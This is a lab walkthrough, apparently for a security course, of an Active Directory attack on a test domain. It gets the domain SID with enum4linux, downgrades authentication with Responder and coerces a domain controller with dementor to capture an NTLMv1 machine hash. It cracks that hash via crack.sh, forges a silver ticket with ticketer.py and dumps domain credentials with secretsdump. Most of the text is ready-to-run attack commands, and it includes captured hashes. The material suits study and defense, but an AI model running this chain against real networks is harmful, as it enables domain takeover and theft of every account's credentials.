You can watch a video walk-through here: https://youtu.be/WuDTcwCjZ5s
# Getting the SID
```bash
enum4linux 192.168.50.135
```
The only information you need to run this command is the IP address of the Domain controller which in my case was 192.168.50.135.
![](https://raw.githubusercontent.com/njg7716/CSEC-742_ADE/main/Pasted%20image%2020210415122818.png)
We find that the SID is "S-1-5-21-3294894903-2995586124-3146476039"
This will be used later when generating the silver ticket.

# Responder
```bash
sudo python Responder.y -I eth0 -wrf --lm
```
Here the argument "--lm" is important because it downgrade the authentication used so that we can use crack.sh for free.

# Dementor
While responder is running, we can use dementor so that responder catches the response.
```bash
python3 dementor.py -u hacker -p ‘WordPass1’ -d CYBERTIGERS 192.168.50.136 192.168.50.135
```
Here the username is "hacker" with password "WordPass1", the domain is cybertigers and the first IP address is the attacker's machine and the second IP is the Domain Controller.
![[Pasted image 20210415123202.png]]
We get the hash for the machine account to be WIN-A2HCLSJFD0C$::CYBERTIGERS:D8C31819C7D7C02F9EEA1DF384DFC524DD51753DEFB3DA92:D8C31819C7D7C02F9EEA1DF384DFC524DD51753DEFB3DA92:1122334455667788

# NTLM MultiTool
``` bash 
python ntlmv1.py --ntlmv1 "WIN-A2HCLSJFD0C$::CYBERTIGERS:D8C31819C7D7C02F9EEA1DF384DFC524DD51753DEFB3DA92:D8C31819C7D7C02F9EEA1DF384DFC524DD51753DEFB3DA92:1122334455667788"
```
![[Pasted image 20210415123624.png]]
This output of this command gives the exact syntax to crack the hash using either hashcat or crack.sh

# Crack.sh
![[Pasted image 20210415123723.png]]
You can see from the screenshot I took the output of the last command and put it in crack.sh to crack and did not have to pay. It takes about 30 seconds to crack and I got the token of b704c94f943cd358cc77900267266b65

# Generating a Silver Ticket
```bash
python3 ticketer.py -nthash b704c94f943cd358cc77900267266b65 -domain-sid S-1-5-21-3294894903-2995586124-3146476039 -domain CYBERTIGERS.net -spn "HOST/DC1.CYBERTIGERS.net" Administrator
```
We give ticketer.py the token from crack.sh and it is of type nthash, along with the SID we got earlier, the domain cybertigers, the spn which in this case is the default value, and the Administrator username which is again default in this case.
![[Pasted image 20210415124056.png]]
The output is a file called Administrator.ccache

# DC Sync Time!
```bash
export KRB5CCNAME=Administrator.ccache
```
First you need to set the variable name KRB5CCNAME to the Administrator.ccache in order for secretsdump to work

```bash
python3 secretsdump.py Administrator@DC1.cybertigers.net -k -no-pass
```
Then we can run secrets dump giving it the username Administrator @ DC1 . the domain which is cybertigers.net and then we specify to use Kerberos because we have a silver ticket and to not ask for a password.
![[Pasted image 20210415124416.png]]
And that is it!
